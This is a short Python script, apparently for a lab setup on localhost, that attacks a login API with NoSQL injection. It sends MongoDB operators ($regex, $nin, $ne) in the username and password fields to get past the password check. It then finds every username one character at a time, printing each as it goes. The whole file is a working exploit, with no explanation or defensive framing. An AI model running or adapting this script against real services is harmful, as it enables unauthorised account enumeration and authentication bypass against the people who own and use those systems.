import requests
import string

URL = "http://localhost:3000/api/login"
headers = {"Content-Type": "application/json"}
usuarios_encontrados = []
chars = string.ascii_lowercase + string.digits
def encontrar_usuario(excluir):
    usuario = ""
    while True:
        encontrado = False
        for c in chars:
            payload = {
                "username": {"$regex": f"^{usuario}{c}", "$nin": excluir},
                "password": {"$ne": ""}
            }
            resp = requests.post(URL, json=payload, headers=headers)
            if resp.status_code == 200:
                usuario += c
                print(f"[+] {usuario}")
                encontrado = True
                break
        if not encontrado:
            if usuario == "":
                return None
            return usuario
while True:
    nuevo = encontrar_usuario(usuarios_encontrados)
    if nuevo is None:
        break
    print(f"[✓] {nuevo}\n")
    usuarios_encontrados.append(nuevo)

